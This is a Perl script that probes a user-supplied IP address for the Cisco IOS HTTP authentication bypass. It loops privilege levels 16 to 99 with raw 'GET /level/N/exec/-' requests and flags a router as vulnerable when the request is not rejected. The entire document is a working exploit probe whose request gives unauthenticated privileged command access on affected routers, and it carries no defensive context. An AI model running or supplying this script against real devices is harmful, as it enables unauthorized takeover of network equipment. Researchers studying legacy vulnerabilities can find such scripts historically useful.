#!/usr/bin/perl
# modified roelof's uni.pl
# to check cisco ios http auth bug
# cronos <cronos@olympos.org>
use Socket;
print "enter IP (x.x.x.x): ";
$host= <STDIN>;
chop($host);
$i=16;
$port=80;
$target = inet_aton($host);
$flag=0;
LINE: while ($i<100) { 
# ------------- Sendraw - thanx RFP rfp@wiretrip.net
my @results=sendraw("GET /level/".$i."/exec/- HTTP/1.0\r\n\r\n");
foreach $line (@results){
        $line=~ tr/A-Z/a-z/;
        if ($line =~ /http\/1\.0 401 unauthorized/) {$flag=1;}
        if ($line =~ /http\/1\.0 200 ok/) {$flag=0;}
} 
        if ($flag==1){print "Not Vulnerable with $i\n\r";}
                else {print "$line Vulnerable with $i\n\r"; last LINE; }
        $i++;
sub sendraw {
        my ($pstr)=@_;
        socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) ||
                die("Socket problems\n");
        if(connect(S,pack "SnA4x8",2,$port,$target)){
                my @in;
                select(S);      $|=1;   print $pstr;
                while(<S>){ push @in, $_;}
                select(STDOUT); close(S); return @in;
        } else { die("Can't connect...\n"); }
}
}
